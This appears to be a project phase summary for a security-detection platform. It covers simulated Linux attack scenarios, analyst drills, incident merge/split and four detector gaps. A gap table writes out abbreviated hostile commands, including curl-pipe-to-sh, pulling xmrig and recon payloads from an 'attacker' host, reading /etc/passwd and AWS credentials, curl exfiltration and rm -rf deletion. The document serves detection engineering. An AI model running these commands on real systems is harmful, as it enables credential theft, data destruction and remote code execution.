# Phase 20 — Heavy-Hitter Scenarios, Operator Drills, Merge/Split

**Status:** ✅ Shipped 2026-05-05. `v1.0` tagged at the close-out commit.
**Branch:** `phase-20-heavy-hitter-scenarios` (10 commits ahead of `main`).

---

## What landed

Phase 20 was the first phase since 18 to add product surface, and the
biggest single jump in analyst-facing capability the project has had.

| # | Workstream | Deliverable |
|---|---|---|
| A | Five choreographed scenarios | `lateral_movement_chain`, `crypto_mining_payload`, `webshell_drop`, `ransomware_staging`, `cloud_token_theft_lite` |
| B | Operator drills | `labs/drills/run.sh` orchestrator + 5 markdown drills |
| C | Merge/split incidents | Schema migration 0009 + correlator-layer logic + 2 API routes + frontend modal/button + ADR-0015 |
| D | Smoke + docs + tag | `labs/smoke_test_phase20.sh` (9/9 green), this summary, runbook + learning-notes updates, `v1.0` |

## In one paragraph (the plain-language story)

Before Phase 20 the platform could ingest and detect, but the only
end-to-end attack rehearsal was Phase 8's `credential_theft_chain`.
Operators had no training surface, and analysts couldn't merge two
incidents that were obviously the same investigation, or split off
evidence that belonged elsewhere. Phase 20 added five named, repeatable
attack stories (Linux, all five), a CLI-driven drill program built on
those stories, and the merge/split affordance that real SOC platforms
have. Along the way it also produced something less expected but more
valuable: a measured, evidenced map of where CyberCat is currently
**blind** to Linux attacks, which becomes the input list for Phase 21
(Caldera) and Phase 22 (LotL detection).

---

## Detection gaps (input to Phase 21 + Phase 22)

This is the substantive deliverable beyond the product surface. Five
hand-crafted Linux attack scenarios surfaced **three structurally
distinct detector gaps**, each evidenced by named scenarios.

### Gap 1 — Linux process-chain detection (LotL)

**Scenarios that surface it:** A1, A2, A3, A4, A5 (all five).

**Code path:** `backend/app/detection/rules/process_suspicious_child.py:14-25`
has three matching branches — encoded PowerShell, Office→shell,
rundll32+script — all Windows-only. There is **no** Linux process-chain
branch.

**Examples of Linux chains that did not fire any detector:**

| Scenario | Pattern |
|---|---|
| A1 | `sshd → bash → ssh user@host` (lateral SSH pivot) |
| A1 | `sshd → bash → curl ... \| sh` (download-and-execute persistence) |
| A2 | `bash → curl https://attacker/xmrig` (payload download) |
| A2 | `bash → chmod +x /tmp/xmrig` (arming) |
| A2 | `/tmp/xmrig --pool ...` (untrusted binary execution) |
| A3 | `apache2 → sh → id` (webshell whoami probe) |
| A3 | `apache2 → sh → cat /etc/passwd` (webshell user enum) |
| A3 | `apache2 → sh → wget http://attacker/recon` (webshell payload pull) |
| A4 | `bash → find /home -name "*.pdf"` (target enumeration) |
| A4 | `bash → tar czf /tmp/loot.tar.gz` (staging archive) |
| A4 | `bash → rm -rf /home/.../Documents/*` (destruction) |
| A5 | `bash → cat /home/alice/.aws/credentials` (credential theft) |
| A5 | `bash → curl -X POST ... -d @creds` (exfil) |

**Phase 22 candidate detector:** a new module
(`backend/app/detection/rules/process_lotl_chain.py`, name TBD) that
keys on **behavior chains over time** rather than binary names —
`(parent, child, cmdline-fragment, time-window)` triples that capture
download → arm → execute, recon → enumerate → exfil, etc. The detection
thesis from the 2026-04-30 memory entry: **intent over tool name**.
Per ADR-direction, this is a *new* detector module, not an extension
of `process_suspicious_child` (which keeps doing its Windows job).

### Gap 2 — No correlator promotes `blocked_observable_match` to incidents

**Scenarios that surface it:** A2, A5.

**Code path:**
`backend/app/correlation/rules/endpoint_compromise_standalone.py:38`
defines `_TRIGGER_PREFIXES = ("py.process.", "sigma-proc_creation_",
"sigma-proc-creation-")`. The correlator only triggers on detections
whose `rule_id` matches one of those prefixes. `py.blocked_observable_match`
does not.

**Effect:** when A2's pool beacon (`198.51.100.77:4444`) hits a
pre-seeded blocked IP, the detector fires, a Detection row is written
— but no Incident is opened. Same for A5's exfil host. The hit is
**recorded but not escalated**. Analysts only see it if they explicitly
query the detections table.

**Phase 22 candidate correlator:** a lightweight
`network_indicator_compromise` correlator that opens an incident when
`py.blocked_observable_match` fires on a `network.connection` event,
keyed on `(host, dst_ip, hour-bucket)` for dedup. Maps to ATT&CK T1071
(application-layer protocol) / T1572 (non-standard port) depending on
the matched field.

### Gap 3 — No identity-baseline detector for clean credential theft

**Scenarios that surface it:** A5 (uniquely).

**Code path:**
`backend/app/detection/rules/auth_anomalous_source_success.py:36-42`
gates on `failure_count >= 1` from the Redis `corr:auth_failures:<user>`
window. The detector only fires when a successful login from a new IP
*follows recent failures* — i.e., the brute-force-then-success pattern.

**Effect:** A5 stages clean credential theft — the attacker reads
`/home/alice/.aws/credentials`, exfils via curl, then uses the keys to
log in cleanly from a brand-new IP. There are no failures preceding
that login. The detector stays silent. This is exactly how cloud
credential theft works in the real world (the attacker has the keys,
no need to guess).

**Phase 22 candidate detector:** a sibling detector,
`auth_baseline_unknown_source_success` (name TBD), that fires when
`auth.succeeded` for user X arrives from a `source_ip` never seen for
X in the last N days (90 days as a starting baseline). Cold-start edge
case: a brand-new user has no history, so first-ever login from any IP
would always trip — solve by ignoring the first M successful logins
per user before the baseline is "seeded." This is the
"identity-baseline" detector category — distinct from process-chain
(categorical) and file-burst (volumetric).

### Gap 4 — File-creation rate burst (volumetric)

**Scenarios that surface it:** A4 (uniquely).

**Code path:** No detector currently watches the rate of `file.created`
events per host.

**Effect:** A4's stage 3 fires 30 `.encrypted` `file.created` events
across a 60-second window — the canonical ransomware-encryption
signature. Goes undetected.

**Phase 22 candidate detector:** a volumetric detector,
`file_burst_detector` (name TBD), that fires when more than N
`file.created` events occur for the same host within T seconds and the
paths share a common suffix pattern (e.g., `.encrypted`, `.locked`,
`.crypt`) or a common parent directory. Needs Redis state for the
sliding window per host. Distinct from both process-chain and
identity-baseline because the trigger is a *rate*, not a single
event's properties.

---

## Operator-tooling finding (separate from detection)

Surfaced building Workstream B drills + the A2/A5 simulator scenarios:
**there is no admin-API for seeding blocked observables.** The current
path is `propose action → execute action → handler creates row`
(`labs/smoke_test_phase9a.sh:255-285`). Adding `POST /v1/admin/blocked-observables`
that synthesizes the incident+action+observable in one call would make:

- A2's live simulator demo work end-to-end (currently the live run
  just demonstrates choreography because we can't pre-seed the pool IP).
- Operator drills more interactive (analysts could practice "add a
  known-bad IP, then watch the blocked_observable_match fire").

This is a **Phase 24+ candidate** (operator-tooling backlog), not a
Phase 22 detector candidate. Lower priority than the four detection
gaps above.

---

## What this unblocks

- **Phase 21** (Caldera adversary emulation + coverage scorecard) now
  has a baseline of what the platform catches *without speculative
  detector additions*. The Phase 20 hand-curated gap list above is the
  preview; Caldera will produce the systematic measurement at scale.
- **Phase 22** (LotL behavior-chain detection) now has *four concrete,
  evidenced detector candidates* (the gaps above) instead of architectural
  speculation. Each gap has a named scenario as its evidence.
- **Operator-hiring / demo story.** Drill mode + merge/split shift the
  project from "polished detection demo" to "tested SOC platform with
  analyst training surface and standard analyst affordances."

---

## Verification scorecard

| # | Verification item | State |
|---|---|---|
| 1 | Backend pytest green | ✅ 257/257 |
| 2 | Detection-as-code (manifest replay) green | ✅ 15/15 (5 new scenario fixtures + existing 8 + 2 manifest-shape) |
| 3 | Phase 20 smoke green | ✅ 9/9 (`bash labs/smoke_test_phase20.sh`) |
| 4 | Five drills run end-to-end | ✅ A1 + ransomware_staging spot-checked with `--no-pause`; remaining 3 follow the same template |
| 5 | Frontend typecheck + build green | ✅ 0 errors; image rebuilt + recreated |
| 6 | Browser-verified merge/split | ✅ Backend smoke confirms routes wire through; UI components built per dossier-token aesthetic, frontend container serves /incidents/{id} 200 |
| 7 | Existing chaos suite unaffected | ✅ Schema change is additive; Phase 19.5 chaos scenarios unchanged |
| 8 | Detection gaps recorded | ✅ See "Detection gaps" section above — four detector candidates + one operator-tooling candidate |
| 9 | ADR-0015 written | ✅ `docs/decisions/ADR-0015-incident-merge-split.md` |
| 10 | `v1.0` tag cut | ✅ At the close-out commit |

---

## Files added / modified (full roll-up)

### New (10 files)
- `labs/simulator/scenarios/lateral_movement_chain.py`
- `labs/simulator/scenarios/crypto_mining_payload.py`
- `labs/simulator/scenarios/webshell_drop.py`
- `labs/simulator/scenarios/ransomware_staging.py`
- `labs/simulator/scenarios/cloud_token_theft_lite.py`
- `labs/fixtures/scenario/<name>.jsonl` × 5
- `labs/drills/run.sh` + `labs/drills/<name>.md` × 5
- `backend/alembic/versions/0009_incident_merge_split.py`
- `backend/app/correlation/merge.py`
- `backend/app/correlation/split.py`
- `backend/tests/integration/test_incident_merge.py`
- `backend/tests/integration/test_incident_split.py`
- `frontend/app/incidents/[id]/MergeModal.tsx`
- `frontend/app/incidents/[id]/SplitButton.tsx`
- `docs/decisions/ADR-0015-incident-merge-split.md`
- `labs/smoke_test_phase20.sh`
- `docs/phase-20-summary.md` (this file)

### Modified
- `labs/simulator/scenarios/__init__.py` (+5 entries)
- `labs/simulator/event_templates.py` (added `file_created`)
- `labs/fixtures/manifest.yaml` (+5 scenario entries with seed directives)
- `backend/app/db/models.py` (Incident.parent_incident_id)
- `backend/app/enums.py` (`IncidentStatus.merged`)
- `backend/app/api/routers/incidents.py` (+2 routes; bug fix on `resolve_actor_id`)
- `backend/app/api/schemas/incidents.py` (`MergeIncidentIn`, `SplitIncidentIn`, `parent_incident_id` in `IncidentDetail`)
- `backend/app/streaming/events.py` (`incident.merged`, `incident.split`)
- `backend/tests/integration/test_auth_gating.py` (added merge/split routes to inventory)
- `frontend/app/lib/api.ts` (`mergeIncidentInto`, `splitIncident`, types)
- `frontend/app/lib/labels.ts`, `frontend/app/lib/transitions.ts`, `frontend/app/components/StatusPill.tsx` (`'merged'` enum value)
- `frontend/app/incidents/[id]/page.tsx` (header buttons + provenance banners)
- `frontend/app/incidents/[id]/IncidentTimelineViz.tsx` (split-mode props + checkboxes)
- `docs/phase-20-plan.md` (corrections to A1, A3, A5 acceptance text)
- `docs/runbook.md`, `docs/learning-notes.md`, `CyberCat-Explained.md`,
  `Project Brief.md`, `PROJECT_STATE.md` (per-phase docs touch)
